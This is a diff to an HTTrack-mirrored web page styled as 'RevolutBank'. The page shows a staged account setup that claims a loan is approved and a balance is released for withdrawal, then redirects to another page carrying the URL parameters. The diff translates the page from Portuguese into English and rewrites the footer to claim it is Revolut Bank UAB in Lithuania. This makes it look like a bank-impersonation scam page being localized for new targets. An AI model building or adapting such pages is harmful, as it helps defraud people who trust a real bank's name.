@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 
-<html lang="pt-BR">
+<html lang="en">
 <!-- Mirrored from suupr-fk.pages.dev/configurando-conta by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 02 Apr 2026 11:36:25 GMT -->
 <!-- Added by HTTrack --><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
 <head>
@@ -22,7 +22,7 @@
 <script async="" data-utmify-prevent-subids="" data-utmify-prevent-xcod-sck="" defer="" src="js/latest-8.js"></script>
 <meta charset="utf-8"/>
 <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport"/>
-<title>RevolutBank — Configurando sua conta</title>
+<title>RevolutBank — Setting Up Your Account</title>
 <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&amp;family=Outfit:wght@400;500;600;700;800&amp;family=Sora:wght@600;700;800&amp;family=Plus+Jakarta+Sans:wght@400;500;600;700;800&amp;family=Poppins:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/>
 <style>
     * {
@@ -315,39 +315,39 @@
 </div>
 <!-- GREETING -->
 <div class="greeting">
-<span>Olá,</span>
-<h1 id="userName">Cliente</h1>
+<span>Hello,</span>
+<h1 id="userName">Customer</h1>
 </div>
 <!-- SPINNER -->
 <div class="spinner-area">
 <div class="spinner"></div>
 </div>
-<div class="status-text" id="statusText">Configurando sua conta</div>
+<div class="status-text" id="statusText">Setting up your account</div>
 <!-- CHECKLIST -->
 <div class="checklist" id="checklist">
 <div class="check-item" id="step1">
 <div class="check-icon"><svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
 <path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path>
 </svg></div>
-<span class="check-text"><span data-msg="configurando.t03">Conta criada com sucesso</span></span>
+<span class="check-text"><span data-msg="configurando.t03">Account created successfully</span></span>
 </div>
 <div class="check-item" id="step2">
 <div class="check-icon"><svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
 <path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path>
 </svg></div>
-<span class="check-text"><span data-msg="configurando.t04">Empréstimo aprovado e disponível</span></span>
+<span class="check-text"><span data-msg="configurando.t04">Loan approved and available</span></span>
 </div>
 <div class="check-item" id="step3">
 <div class="check-icon"><svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
 <path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path>
 </svg></div>
-<span class="check-text"><span data-msg="configurando.t05">Saldo liberado para saque</span></span>
+<span class="check-text"><span data-msg="configurando.t05">Balance released for withdrawal</span></span>
 </div>
 <div class="check-item" id="step4">
 <div class="check-icon"><svg fill="none" stroke="currentColor" viewbox="0 0 24 24">
 <path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path>
 </svg></div>
-<span class="check-text"><span data-msg="configurando.t06">Conta pronta para transferência</span></span>
+<span class="check-text"><span data-msg="configurando.t06">Account ready for transfer</span></span>
 </div>
 </div>
 <!-- PROGRESS BAR -->
@@ -355,12 +355,12 @@
 <div class="progress-bar">
 <div class="progress-fill" id="progFill"></div>
 </div>
-<div class="progress-label" id="progLabel">Preparando tudo para si...</div>
+<div class="progress-label" id="progLabel">Getting everything ready for you...</div>
 </div>
 </div>
 <!-- FOOTER -->
 <div class="splash-foot">
-<p>RevolutBank — Sucursal em Portugal<br/>Ambiente seguro com encriptação SSL</p>
+<p>Revolut Bank UAB — Headquartered in Lithuania<br/>Secure environment with SSL encryption</p>
 </div>
 <script>
     // Load user name
@@ -376,11 +376,11 @@
     const statusText = document.getElementById('statusText');
 
     const messages = [
-      'Configurando sua conta',
-      'Verificando dados',
-      'Ativando empréstimo',
-      'Preparando ambiente',
-      'Quase pronto...'
+      'Setting up your account',
+      'Verifying data',
+      'Activating loan',
+      'Preparing environment',
+      'Almost ready...'
     ];
 
     // Animate steps one by one
@@ -396,8 +396,8 @@
         setTimeout(nextStep, 1800);
       } else {
         // All done - redirect
-        label.textContent = 'Pronto! Redirecionando...';
-        statusText.textContent = 'Tudo pronto!';
+        label.textContent = 'Ready! Redirecting...';
+        statusText.textContent = 'All set!';
         setTimeout(() => {
           const p = new URLSearchParams(window.location.search);
           window.location.href = 'conta.html' + (p.toString() ? '?' + p : '');
